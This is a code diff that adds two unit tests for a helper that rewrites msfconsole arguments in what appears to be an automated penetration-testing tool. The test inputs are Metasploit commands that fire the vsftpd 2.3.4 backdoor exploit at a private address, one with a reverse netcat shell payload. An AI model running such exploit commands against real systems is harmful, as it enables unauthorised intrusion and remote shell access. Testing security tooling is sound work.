@@ -248,3 +248,20 @@ class TestMsfconsoleSafetyRewrite:
         lowered = script.lower()
         exploit_idx = lowered.rindex("; exploit")
         assert lowered.index("set payload") < exploit_idx < lowered.index("exit -y")
+
+    def test_reverse_payload_gets_auto_lhost_when_missing(self, executor, monkeypatch):
+        monkeypatch.setenv("SDIT_LHOST", "10.10.10.5")
+        args = "-q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.1.10; set PAYLOAD cmd/unix/reverse_netcat; exploit; exit'"
+        new_args, notes = executor._rewrite_msfconsole_args(args)
+
+        script = shlex.split(new_args)[2]
+        assert "set LHOST 10.10.10.5" in script
+        assert any("LHOST=10.10.10.5" in n for n in notes)
+
+    def test_interact_payload_does_not_need_lhost(self, executor, monkeypatch):
+        monkeypatch.setenv("SDIT_LHOST", "10.10.10.5")
+        args = "-q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.1.10; set PAYLOAD cmd/unix/interact; exploit; exit'"
+        new_args, _notes = executor._rewrite_msfconsole_args(args)
+
+        script = shlex.split(new_args)[2]
+        assert "set LHOST" not in script
